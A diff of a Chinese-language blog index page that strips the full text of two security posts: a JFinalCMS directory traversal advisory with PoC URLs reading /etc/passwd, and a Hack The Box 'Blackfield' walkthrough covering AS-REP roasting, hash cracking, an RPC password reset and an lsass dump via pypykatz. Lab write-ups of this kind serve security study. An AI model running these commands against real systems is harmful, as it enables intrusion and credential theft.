@@ -117,6 +117,11 @@
     <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
@@ -201,7 +206,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2024-09-27 20:50:46 / 修改时间：21:02:10" itemprop="dateCreated datePublished" datetime="2024-09-27T20:50:46+08:00">2024-09-27</time>
+              <time title="创建时间：2024-09-27 20:50:46 / 修改时间：21:10:23" itemprop="dateCreated datePublished" datetime="2024-09-27T20:50:46+08:00">2024-09-27</time>
             </span>
 
           
@@ -215,19 +220,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="Directory-traversal-in-JFinalCMS"><a href="#Directory-traversal-in-JFinalCMS" class="headerlink" title="Directory traversal in JFinalCMS"></a>Directory traversal in JFinalCMS</h1><blockquote>
-<p>source code:  <a target="_blank" rel="noopener" href="https://gitee.com/heyewei/JFinalcms">https://gitee.com/heyewei/JFinalcms</a></p>
-<p>Official website :<a target="_blank" rel="noopener" href="http://www.xiadaima.com/">http://www.xiadaima.com/</a></p>
-</blockquote>
-<h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze:"></a>Analyze:</h2><p>The vulnerable file is in <code>com/cms/controller/common/DownController.java</code></p>
-<img src="/undefined/68b58dca/image-20230828144150045.png" class="">
-
-<p>We can easily find that the file function concatenates the file name of  the <code>fileKey</code> parameter as a string directly with the overall file path,  without performing black and white list verification or security  verification, which allows us to utilize Perform directory traversal</p>
-<img src="/undefined/68b58dca/image-20230828144143097.png" class="">
-
-<p>poc:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I set a test.txt in E:\test.txt.And this java sysytem is also set in E-disk.</span><br><span class="line">Windows: /common/down/file?fileKey=/../../../../../../../../../test.txt</span><br><span class="line">Linux:	/common/down/file?fileKey=/../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-<img src="/undefined/68b58dca/image-20230828144727066.png" class="">
+          <h1 id="Directory-traversal-in-JFinalCMS"><a href="#Directory-traversal-in-JFinalCMS" class="headerlink" title="Directory traversal in JFinalCMS"></a>Directory traversal in JFinalCMS</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/undefined/68b58dca.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -277,7 +278,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-09-27 21:02:10" itemprop="dateModified" datetime="2024-09-27T21:02:10+08:00">2024-09-27</time>
+                <time title="修改时间：2024-09-27 21:10:45" itemprop="dateModified" datetime="2024-09-27T21:10:45+08:00">2024-09-27</time>
               </span>
 
           
@@ -291,147 +292,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="HTB-Blackfiled-Walkthrough"><a href="#HTB-Blackfiled-Walkthrough" class="headerlink" title="HTB Blackfiled  Walkthrough"></a>HTB Blackfiled  Walkthrough</h1><h2 id="0x00-盒子简介"><a href="#0x00-盒子简介" class="headerlink" title="0x00 盒子简介"></a>0x00 盒子简介</h2><img src="/undefined/3db8feaa/Blackfield.png" class="">
-
-<h2 id="0x01-思路简介"><a href="#0x01-思路简介" class="headerlink" title="0x01 思路简介"></a>0x01 思路简介</h2><p>​		获得靶机后，我运用nmap进行服务端口信息收集，发现可以利用匿名用户登录共享文件夹profile$，但里面没有任何内容，但我们可以利用文件夹列表建立用户名列表，然后利用AS-REP roasting获得有效凭证，然后利用bloodhound发现改用户权限，从而利用RPC重置另一个账户的密码，然后利用该账户访问另一个共享文件，其中获得了lsass的内存转储，然后在本地利用pypykatz来转储它的哈希值。最后，使用winrm登录最新获取的用户，利用sebackupprivilege权限来备份ntds.dit,从而进一步获得所有账户的哈希转储。</p>
-<h2 id="0x02-Recon"><a href="#0x02-Recon" class="headerlink" title="0x02 Recon"></a>0x02 Recon</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>TCP：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap --min-rate 10000 -p- -Pn -oN nmaptcp</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p 53,88,135,445,3268,5985 -sC -sV -oN nmaptcp</span><br><span class="line">Nmap scan report for 10.10.10.192                                                                </span><br><span class="line">Host is up (0.46s latency).</span><br><span class="line">                        </span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-09 16:08:58Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found                         </span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:                            </span><br><span class="line">| smb2-time:                                    </span><br><span class="line">|   date: 2023-05-09T16:09:19</span><br><span class="line">|_  start_date: N/A                             </span><br><span class="line">|_clock-skew: 6h59m59s                          </span><br><span class="line">| smb2-security-mode:                           </span><br><span class="line">|   311:                                        </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Tue May  9 17:10:00 2023 -- 1 IP address (1 host up) scanned in 72.69 seconds</span><br></pre></td></tr></table></figure>
-
-<p>UDP：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sU --min-rate=1000 -p- -oN nmapudp 10.10.10.192</span><br><span class="line">Nmap scan report for 10.10.10.192</span><br><span class="line">Host is up (0.79s latency).</span><br><span class="line">Not shown: 65533 open|filtered udp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">53/udp  open  domain</span><br><span class="line">389/udp open  ldap</span><br></pre></td></tr></table></figure>
-
-<h3 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h3><p>获得了<code>domain name</code>:BLACKFIELD.local</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -H ldap://10.10.10.192 -x -s base namingcontexts</span><br><span class="line"></span><br><span class="line">namingcontexts: DC=BLACKFIELD,DC=local</span><br><span class="line">namingcontexts: CN=Configuration,DC=BLACKFIELD,DC=local</span><br><span class="line">namingcontexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local</span><br><span class="line">namingcontexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local</span><br><span class="line">namingcontexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local</span><br></pre></td></tr></table></figure>
-
-<h3 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h3><p>发现可以匿名访问两个共享文件夹</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ smbmap -H 10.10.10.192 -u null    </span><br><span class="line">[+] Guest session       IP: 10.10.10.192:445    Name: 10.10.10.192                                      </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        forensic                                                NO ACCESS       Forensic / Audit share.</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                NO ACCESS       Logon server share </span><br><span class="line">        profiles$                                               READ ONLY</span><br><span class="line">        SYSVOL                                                  NO ACCESS       Logon server share</span><br></pre></td></tr></table></figure>
-
-<p>最后在<code>profiles$</code>找到了一些有效的内容，但是每个文件夹中都没有内容，但是关注到文件夹名称，我们可以收集文件夹名作为用户名列表。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient -N \\\\10.10.10.192\\profiles$                                                                                                                                                       </span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.                                                                                                                                                     </span><br><span class="line">smb: \&gt; ls                                                                                                                                                                                         </span><br><span class="line">  .                                   D        0  Thu Jun  4 00:47:12 2020                                                           </span><br><span class="line">  ..                                  D        0  Thu Jun  4 00:47:12 2020                                                    </span><br><span class="line">  AAlleni                             D        0  Thu Jun  4 00:47:11 2020                                                           </span><br><span class="line">  ABarteski                           D        0  Thu Jun  4 00:47:11 2020                                                           </span><br><span class="line">  ABekesz                             D        0  Thu Jun  4 00:47:11 2020                                                          </span><br><span class="line">  ABenzies                            D        0  Thu Jun  4 00:47:11 2020                                                           </span><br><span class="line">  ABiemiller                          D        0  Thu Jun  4 00:47:11 2020                                                           </span><br><span class="line">  AChampken                           D        0  Thu Jun  4 00:47:11 2020                                                           </span><br><span class="line">  ACheretei                           D        0  Thu Jun  4 00:47:11 2020                                                           </span><br><span class="line">  ACsonaki                            D        0  Thu Jun  4 00:47:11 2020                                                          </span><br><span class="line">  AHigchens                           D        0  Thu Jun  4 00:47:11 2020                                                          </span><br><span class="line">  AJaquemai                           D        0  Thu Jun  4 00:47:11 2020                                                    </span><br><span class="line">  AKlado                              D        0  Thu Jun  4 00:47:11 2020</span><br><span class="line">  AKoffenburger                       D        0  Thu Jun  4 00:47:11 2020</span><br><span class="line">  AKollolli                           D        0  Thu Jun  4 00:47:11 2020</span><br><span class="line">  AKruppe                             D        0  Thu Jun  4 00:47:11 2020</span><br><span class="line">  AKubale                             D        0  Thu Jun  4 00:47:11 2020</span><br><span class="line">  ALamerz                             D        0  Thu Jun  4 00:47:11 2020</span><br><span class="line">  AMaceldon                           D        0  Thu Jun  4 00:47:11 2020</span><br><span class="line">  AMasalunga                          D        0  Thu Jun  4 00:47:11 2020</span><br><span class="line">  ANavay                              D        0  Thu Jun  4 00:47:11 2020</span><br><span class="line">  ANesterova                          D        0  Thu Jun  4 00:47:11 2020</span><br><span class="line">  ANeusse                             D        0  Thu Jun  4 00:47:11 2020</span><br><span class="line">  &lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
-
-<p>下载所有文件夹后，将所有文件名整理到文件中。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; recurse on</span><br><span class="line">smb: \&gt; prompt off</span><br><span class="line">smb: \&gt; mget *</span><br><span class="line">smb: \&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al|cut -d &#x27;:&#x27; -f2|tr &#x27; &#x27; &#x27;,&#x27;|cut -d &#x27;,&#x27; -f2 &gt; users</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="0x03-Access-as-support"><a href="#0x03-Access-as-support" class="headerlink" title="0x03 Access as support"></a>0x03 Access as support</h2><h3 id="userenum"><a href="#userenum" class="headerlink" title="userenum"></a>userenum</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ ./kerbrute_ userenum --dc 10.10.10.192 -d BLACKFIELD.LOCAL /home/sollupus/OSCP/Blackfield/Creds/users -t 50                                                                                  </span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: v1.0.3 (9dad6e1) - 05/09/23 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2023/05/09 22:41:09 &gt;  Using KDC(s):</span><br><span class="line">2023/05/09 22:41:09 &gt;   10.10.10.192:88</span><br><span class="line"></span><br><span class="line">2023/05/09 22:41:14 &gt;  [+] VALID USERNAME:       audit2020@BLACKFIELD.LOCAL</span><br><span class="line">2023/05/09 22:41:43 &gt;  [+] VALID USERNAME:       support@BLACKFIELD.LOCAL</span><br><span class="line">2023/05/09 22:41:43 &gt;  [+] VALID USERNAME:       svc_backup@BLACKFIELD.LOCAL</span><br><span class="line">2023/05/09 22:41:48 &gt;  Done! Tested 315 usernames (3 valid) in 39.649 seconds</span><br></pre></td></tr></table></figure>
-
-<h3 id="AS-REP-roast"><a href="#AS-REP-roast" class="headerlink" title="AS-REP roast"></a>AS-REP roast</h3><p>获得有效用户名列表后，利用impacket里的<code>GetNPUsers</code>执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-GetNPUsers &#x27;BLACKFIELD.LOCAL/&#x27;  -usersfile vali_user -format hashcat -outputfile hashes.asp -dc-ip 10.10.10.192</span><br><span class="line"></span><br><span class="line">$ cat hashes.asp                    </span><br><span class="line">$krb5asrep$23$support@BLACKFIELD.LOCAL:a3ed233fba253c99c06ebaf99736a3bc$e03c1b4d964a5d247b12222254efa9501b9d0be17bb089af9cd18bd7384c24619d153a0fd1d5f5981e3196c258c9a67c41a9a59ea0876bf8a3fd0e257c0c4147aa589fe5ef920f78e61f11b80dc61b87ba157aa01027433501dcd98e89c51b192fb2735adf5145cdcbbab27a0bb944acef1d0d5b2c0c782ddd8427843a6bf13f124ca8f68550eddddcb2686fdbbeb3c2d79b51f5f4991141242a79d2e7cb8157e833c8e04f401c0d2d927b40d334400e7ffcb63104c8ad735bfb4f5c1ca3ae1716bdf497ad15f52a1ba2d2776463711841493b0d5611bbc8906e1827bc32c38fa2e686bf38f695c7b0040583dcb1d7faf73a7e8a</span><br></pre></td></tr></table></figure>
-
-<h3 id="Crack-Hash"><a href="#Crack-Hash" class="headerlink" title="Crack Hash"></a>Crack Hash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 18200 --force hashes.asp /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">$krb5asrep$23$support@BLACKFIELD.LOCAL:a3ed233fba253c99c06ebaf99736a3bc$e03c1b4d964a5d247b12222254efa9501b9d0be17bb089af9cd18bd7384c24619d153a0fd1d5f5981e3196c258c9a67c41a9a59ea0876bf8a3fd0e257c0c4147aa589fe5ef920f78e61f11b80dc61b87ba157aa01027433501dcd98e89c51b192fb2735adf5145cdcbbab27a0bb944acef1d0d5b2c0c782ddd8427843a6bf13f124ca8f68550eddddcb2686fdbbeb3c2d79b51f5f4991141242a79d2e7cb8157e833c8e04f401c0d2d927b40d334400e7ffcb63104c8ad735bfb4f5c1ca3ae1716bdf497ad15f52a1ba2d2776463711841493b0d5611bbc8906e1827bc32c38fa2e686bf38f695c7b0040583dcb1d7faf73a7e8a:#00^BlackKnight</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Access-Check"><a href="#Access-Check" class="headerlink" title="Access Check"></a>Access Check</h3><p>smb-&gt;access</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 10.10.10.192 -u support -p &#x27;#00^BlackKnight&#x27;</span><br><span class="line"></span><br><span class="line">SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight:#00^BlackKnight</span><br></pre></td></tr></table></figure>
-
-<p>winrm-&gt;failed</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec winrm 10.10.10.192 -u support -p &#x27;#00^BlackKnight&#x27;</span><br><span class="line">SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)</span><br><span class="line">HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman</span><br><span class="line">WINRM       10.10.10.192    5985   DC01             [-] BLACKFIELD.local\support:#00^BlackKnight</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x04-support-gt-audit2020"><a href="#0x04-support-gt-audit2020" class="headerlink" title="0x04 support -&gt; audit2020"></a>0x04 support -&gt; audit2020</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ smbmap -H 10.10.10.192 -u support -p &#x27;#00^BlackKnight&#x27;                                                                                                                                 </span><br><span class="line">[+] IP: 10.10.10.192:445        Name: 10.10.10.192                                      </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        forensic                                                NO ACCESS       Forensic / Audit share.</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                READ ONLY       Logon server share </span><br><span class="line">        profiles$                                               READ ONLY</span><br><span class="line">        SYSVOL                                                  READ ONLY       Logon server share</span><br></pre></td></tr></table></figure>
-
-<p>遍历可进入的共享文件夹后，发现并没有什么可用信息。</p>
-<h3 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h3><p>于是尝试用bloodhound进行域内权限关系</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 bloodhound.py -u support -p &#x27;#00^BlackKnight&#x27; -c All -ns 10.10.10.192 -d blackfield.local --zip</span><br></pre></td></tr></table></figure>
-
-<p>将得到的zip包导入到Bloodhound中，然后找到了如下信息。</p>
-<img src="/undefined/3db8feaa/image-20230509230203124.png" class="">
-
-<p>这意味着，我们可以强制更改AUDIT2020账号的密码。</p>
-<h3 id="Password-Reset-Over-Rpc"><a href="#Password-Reset-Over-Rpc" class="headerlink" title="Password Reset Over Rpc"></a>Password Reset Over Rpc</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://room362.com/post/2017/reset-ad-user-password-with-linux/">https://room362.com/post/2017/reset-ad-user-password-with-linux/</a></p>
-</blockquote>
-<p>我们可以用rpcclient登录，然后用<code>setuserinfo2</code>命令来更改账户密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ rpcclient -U support 10.10.10.192                                             </span><br><span class="line">Password for [WORKGROUP\support]:</span><br><span class="line">rpcclient $&gt; setuserinfo2 audit2020 23 &#x27;Password@!!&#x27;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Access-check"><a href="#Access-check" class="headerlink" title="Access check"></a>Access check</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 10.10.10.192 -u audit2020 -p &#x27;Password@!!&#x27;                            130 ⨯</span><br><span class="line">SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:Password@!!:Password@!!</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec winrm 10.10.10.192 -u audit2020 -p &#x27;Password@!!&#x27;    </span><br><span class="line">SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)</span><br><span class="line">HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman</span><br><span class="line">WINRM       10.10.10.192    5985   DC01             [-] BLACKFIELD.local\audit2020:Password@!!</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x05-audit2020-gt-svc-backup"><a href="#0x05-audit2020-gt-svc-backup" class="headerlink" title="0x05 audit2020-&gt;svc_backup"></a>0x05 audit2020-&gt;svc_backup</h2><h3 id="Enumration"><a href="#Enumration" class="headerlink" title="Enumration"></a>Enumration</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ smbmap -H 10.10.10.192 -u audit2020 -p &#x27;Password@!!&#x27;             </span><br><span class="line">[+] IP: 10.10.10.192:445        Name: 10.10.10.192                                      </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        forensic                                                READ ONLY       Forensic / Audit share.</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                READ ONLY       Logon server share </span><br><span class="line">        profiles$                                               READ ONLY</span><br><span class="line">        SYSVOL                                                  READ ONLY       Logon server share</span><br></pre></td></tr></table></figure>
-
-<p>然后发现<code>forensic</code>共享文件夹中有内存转储信息，其中<code>lsass</code>的内存转储对我们进行进一步的横向移动有很大帮助。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient -U &#x27;audit2020%Password@!!&#x27; \\\\10.10.10.192\\forensic</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Sun Feb 23 21:03:16 2020</span><br><span class="line">  ..                                  D        0  Sun Feb 23 21:03:16 2020</span><br><span class="line">  commands_output                     D        0  Mon Feb 24 02:14:37 2020</span><br><span class="line">  memory_analysis                     D        0  Fri May 29 04:28:33 2020</span><br><span class="line">  tools                               D        0  Sun Feb 23 21:39:08 2020</span><br><span class="line"></span><br><span class="line">                5102079 blocks of size 4096. 1599037 blocks available</span><br><span class="line">smb: \&gt; cd memory_analysis</span><br><span class="line">smb: \memory_analysis\&gt; ls</span><br><span class="line">  .                                   D        0  Fri May 29 04:28:33 2020</span><br><span class="line">  ..                                  D        0  Fri May 29 04:28:33 2020</span><br><span class="line">  conhost.zip                         A 37876530  Fri May 29 04:25:36 2020</span><br><span class="line">  ctfmon.zip                          A 24962333  Fri May 29 04:25:45 2020</span><br><span class="line">  dfsrs.zip                           A 23993305  Fri May 29 04:25:54 2020</span><br><span class="line">  dllhost.zip                         A 18366396  Fri May 29 04:26:04 2020</span><br><span class="line">  ismserv.zip                         A  8810157  Fri May 29 04:26:13 2020</span><br><span class="line">  lsass.zip                           A 41936098  Fri May 29 04:25:08 2020</span><br><span class="line">  mmc.zip                             A 64288607  Fri May 29 04:25:25 2020</span><br><span class="line">  RuntimeBroker.zip                   A 13332174  Fri May 29 04:26:24 2020</span><br><span class="line">  ServerManager.zip                   A 131983313  Fri May 29 04:26:49 2020</span><br><span class="line">  sihost.zip                          A 33141744  Fri May 29 04:27:00 2020</span><br><span class="line">  smartscreen.zip                     A 33756344  Fri May 29 04:27:11 2020</span><br><span class="line">  svchost.zip                         A 14408833  Fri May 29 04:27:19 2020</span><br><span class="line">  taskhostw.zip                       A 34631412  Fri May 29 04:27:30 2020</span><br><span class="line">  winlogon.zip                        A 14255089  Fri May 29 04:27:38 2020</span><br><span class="line">  wlms.zip                            A  4067425  Fri May 29 04:27:44 2020</span><br><span class="line">  WmiPrvSE.zip                        A 18303252  Fri May 29 04:27:53 2020</span><br></pre></td></tr></table></figure>
-
-<h3 id="Extract-Hashes"><a href="#Extract-Hashes" class="headerlink" title="Extract Hashes"></a>Extract Hashes</h3><p>解压<code>lsass.zip</code>后得到一个<code>lsass.dmp</code>的文件，然后利用<code>pypytakz</code>工具进行哈希转储。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ pypykatz lsa minidump lsass.DMP &gt; ../../lsadump </span><br><span class="line"></span><br><span class="line">$ cat lsadump |grep username|sort -u</span><br><span class="line">username </span><br><span class="line">                username Administrator</span><br><span class="line">username Administrator</span><br><span class="line">                username DC01$</span><br><span class="line">username DC01$</span><br><span class="line">username DWM-1</span><br><span class="line">username DWM-2</span><br><span class="line">username LOCAL SERVICE</span><br><span class="line">                username svc_backup</span><br><span class="line">username svc_backup</span><br><span class="line">username UMFD-0</span><br><span class="line">username UMFD-1</span><br><span class="line">username UMFD-2</span><br></pre></td></tr></table></figure>
-
